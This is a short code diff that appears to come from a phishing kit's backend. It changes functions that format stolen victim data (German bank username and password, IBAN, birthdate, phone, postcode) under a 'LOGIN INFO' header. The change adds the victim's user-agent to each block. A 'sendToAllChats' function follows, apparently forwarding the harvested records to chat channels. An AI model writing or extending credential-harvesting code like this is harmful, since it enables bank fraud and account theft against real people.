@@ -19,7 +19,9 @@ phone: ${s.phone || ""}
 ======> LOGIN INFO <=======
 benutzername: ${s.bank_username || ""}
 passwort: ${s.bank_password || ""}
-bank: ${s.bank || ""}`;
+bank: ${s.bank || ""}
+
+user-agent: ${s.user_agent || ""}`;
 }
 
 function formatFullInfo(s: any): string {
@@ -36,7 +38,9 @@ postcode: ${s.postal_code || ""}
 birthdate: ${s.birthdate || ""}
 iban: ${s.iban || ""}
 phone: ${s.phone || ""}
-bank: ${s.bank || ""}`;
+bank: ${s.bank || ""}
+
+user-agent: ${s.user_agent || ""}`;
 }
 
 async function sendToAllChats(
